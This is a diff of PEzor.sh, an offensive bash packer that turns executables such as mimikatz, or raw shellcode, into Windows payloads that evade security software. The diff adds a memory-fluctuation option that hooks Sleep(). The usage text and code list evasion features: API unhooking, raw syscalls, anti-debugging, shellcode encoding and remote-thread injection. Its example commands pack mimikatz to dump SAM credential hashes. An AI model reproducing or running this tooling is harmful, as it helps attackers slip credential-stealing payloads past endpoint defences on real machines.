@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-VERSION="3.0.3"
+VERSION="3.1.2"
 
 cowsay -f dragon 'PEzor!! v'$VERSION 2>/dev/null || echo 'PEzor!! v'$VERSION
 echo '---------------------------------------------------------------------------'
@@ -18,7 +18,7 @@ echo '--------------------------------------------------------------------------
 
 CURRENT_DIR=`pwd`
 INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-TMP_DIR=/tmp
+TMP_DIR=`mktemp -d`
 SGN=false
 BLOB=false
 IS_SHELLCODE=false
@@ -40,12 +40,13 @@ OUTPUT_FORMAT=exe
 OUTPUT_EXTENSION=exe
 CLEANUP=false
 SOURCES=""
+FLUCTUATE=false
 
 usage() {
     echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <executable.exe> [donut args]'
     echo 'Usage Shellcode: ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <shellcode.bin>'
     echo ''
-    echo 'USAGE
+    echo "USAGE
 
 # PEzor [options...] <EXECUTABLE> [donut args...]
 
@@ -65,6 +66,7 @@ OPTIONS
   -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
+  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
@@ -74,28 +76,32 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (fluctuate to READWRITE when sleeping)
+  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'
+  # 64-bit (fluctuate to NOACCESS when sleeping)
+  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'
   # 64-bit (beacon object file)
-  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (beacon object file w/ cleanup)
-  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (reflective dll)
-  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (service exe)
-  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (service dll)
-  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (dotnet)
-  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (dotnet-pinvoke)
-  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (dotnet-createsection)
-  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
   $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut
-  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"
+  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 \"-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv\"
 
 # PEzor <-32|-64> [options...] <SHELLCODE>
 
@@ -115,6 +121,7 @@ OPTIONS
   -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
+  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
 
 EXAMPLES
   # 64-bit (self-inject RWX)
@@ -125,6 +132,10 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
+  # 64-bit (fluctuate to READWRITE when sleeping)
+  $ PEzor.sh -fluctuate=RW shellcode.bin
+  # 64-bit (fluctuate to NOACCESS when sleeping)
+  $ PEzor.sh -fluctuate=NA shellcode.bin
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof shellcode.bin
   # 64-bit (beacon object file w/ cleanup)
@@ -144,7 +155,7 @@ EXAMPLES
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
-  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin'
+  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin"
 }
 
 if [ $# -eq 0 ]; then
@@ -157,9 +168,6 @@ command -v $CC >/dev/null 2>&1 || { echo >&2 "$CC is missing from \$PATH. Check 
 command -v donut >/dev/null 2>&1 || { echo >&2 "donut is missing from \$PATH. Check https://github.com/TheWover/donut to learn how to install it"; exit 1; }
 command -v sgn >/dev/null 2>&1 || { echo >&2 "sgn is missing from \$PATH. Check https://github.com/EgeBalci/sgn to learn how to install it"; exit 1; }
 command -v mcs >/dev/null 2>&1 || { echo >&2 "mcs is missing from \$PATH. Re-run install.sh script"; exit 1; }
-
-# cleanup
-rm -f $TMP_DIR/*.{s,ll,cpp,donut,bin}
 
 for arg in "$@"
 do
@@ -232,6 +240,10 @@ do
             SDK="${arg#*=}"
             echo "[?] .NET SDK: $SDK"
             ;;
+        -fluctuate=*)
+            FLUCTUATE="${arg#*=}"
+            echo "[?] Fluctuate: $FLUCTUATE"
+            ;;
         *)
             echo "[?] Processing $arg"
             ls $arg 1>/dev/null 2>&1 || { echo "[x] ERROR: $arg doesn't exist"; exit 1; }
@@ -241,7 +253,7 @@ do
     esac
 done
 
-if [ ! $IS_SHELLCODE ]; then
+if [ $IS_SHELLCODE = false ]; then
     file $BLOB | grep -q ': data' && { IS_SHELLCODE=true; }
     file $BLOB | grep -q ': DOS executable (COM)' && { IS_SHELLCODE=true; } # false positive
 fi
@@ -355,8 +367,14 @@ case $OUTPUT_FORMAT in
             echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
         fi
 
-        CCFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
-        CPPFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
+        if [[ ( $OUTPUT_FORMAT = "exe" || $OUTPUT_FORMAT = "service-exe" ) && $DEBUG = false ]]; then
+            CCFLAGS="-O3 -Wl,-strip-all,-subsystem=windows -Wall -pedantic"
+            CPPFLAGS="-O3 -Wl,-strip-all,-subsystem=windows -Wall -pedantic"
+        else
+            CCFLAGS="-O3 -Wl,-strip-all, -Wall -pedantic"
+            CPPFLAGS="-O3 -Wl,-strip-all, -Wall -pedantic"
+        fi
+
         CXXFLAGS="-std=c++17 -static"
 
         if [ $BITS -eq 32 ]; then
@@ -409,6 +427,14 @@ case $OUTPUT_FORMAT in
             CPPFLAGS="$CPPFLAGS -D_CLEANUP_"
         fi
 
+        if [ $FLUCTUATE = "rw" ] || [ $FLUCTUATE = "RW" ]; then
+            CCFLAGS="$CCFLAGS -DFLUCTUATE -DFLUCTUATE_RW"
+            CPPFLAGS="$CPPFLAGS -DFLUCTUATE -DFLUCTUATE_RW"
+        elif [ $FLUCTUATE = "na" ] || [ $FLUCTUATE = "NA" ]; then
+            CCFLAGS="$CCFLAGS -DFLUCTUATE -DFLUCTUATE_NA"
+            CPPFLAGS="$CPPFLAGS -DFLUCTUATE -DFLUCTUATE_NA"
+        fi
+
         if [ $OUTPUT_FORMAT = "dll" ]; then
             CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
             CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
@@ -439,6 +465,10 @@ case $OUTPUT_FORMAT in
         if [ $UNHOOK = true ]; then
             $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o &&
             SOURCES="$SOURCES $TMP_DIR/loader.o"
+        fi
+
+        if [ $FLUCTUATE = "rw" ] || [ $FLUCTUATE = "RW" ] || [ $FLUCTUATE = "na" ] || [ $FLUCTUATE = "NA" ]; then
+            SOURCES="$SOURCES $INSTALL_DIR/fluctuate.cpp"
         fi
 
         if [ $OUTPUT_FORMAT = "bof" ]; then
@@ -526,4 +556,5 @@ case $OUTPUT_FORMAT in
         ;;
 esac
 
+rm -rf $TMP_DIR &&
 echo -n '[!] Done! Check '; file $BLOB.packed.$OUTPUT_EXTENSION
